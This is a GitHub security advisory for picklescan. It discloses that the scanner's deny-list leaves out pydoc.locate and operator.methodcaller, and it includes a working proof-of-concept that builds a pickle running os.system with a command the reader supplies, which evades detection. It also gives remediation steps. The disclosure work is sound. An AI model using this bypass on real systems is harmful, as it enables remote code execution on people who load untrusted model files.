# [H] Picklescan has Incomplete List of Disallowed Inputs

## Summary
Severity: High
Advisory: GHSA-84r2-jw7c-4r5q
CVE: CVE-2025-71320
CWE: CWE-184
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-12-29
Source: https://github.com/advisories/GHSA-84r2-jw7c-4r5q
Type: github-advisory

## Affected
- PyPI: `picklescan` — affected >=0 <0.0.33

## Details
### Summary
Currently picklescanner only blocks some specific functions of the pydoc and operator modules. Attackers can use other functions within these allowed modules to go through undetected and achieve RCE on the final user. Particularly
* pydoc.locate: Can dynamically resolve and import arbitrary modules (e.g., resolving the string "os" to the actual os module).
* operator.methodcaller: Allows executing a method on an object. When combined with a resolved module object, it can execute functions like system.

Since locate and methodcaller are not explicitly listed in the deny-list, picklescan treats them as "Safe" or "Suspicious" (depending on configuration) but does not flag them as "Dangerous", allowing the malicious file to bypass the security check.

### PoC

use the provided script to create a malicious pickle file 

```python
import pickle
import pydoc
import operator
import os

class ModuleLocator:
    def __init__(self, module_name):
        self.module_name = module_name
        
    def __reduce__(self):
        return (pydoc.locate, (self.module_name,))

class RCEPayload:
    def __reduce__(self):
        
        cmd = "notepad" #put your payload here
        
        mc = operator.methodcaller("system", cmd)
        return (mc, (ModuleLocator("os"),))

def generate_exploit():
    payload = RCEPayload()
    
    try:
        with open("bypass.pkl", "wb") as f:
            f.write(pickle.dumps(payload))
        print("File 'bypass.pkl' created.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    generate_exploit()
```

The generated payload will not be flagged as dangerous by picklescan but is actually malicious. 

```python
import pickle
print("Loading bypass.pkl...")
pickle.load(open("bypass.pkl", "rb"))
```

Script to open the pickle file, demonstrating impact

<img width="746" height="341" alt="image" src="https://github.com/user-attachments/assets/2be1b8f9-d467-408d-b1cf-d40b49100cf0" />


### Remediation
The deny-list for these modules must be upgraded from specific functions to a wildcard (*), indicating that any use of these modules is dangerous.

## References
- https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q
- https://nvd.nist.gov/vuln/detail/CVE-2025-71320
- https://github.com/mmaitre314/picklescan/pull/53
- https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab
- https://github.com/mmaitre314/picklescan
- https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33
- https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-incomplete-disallowed-inputs
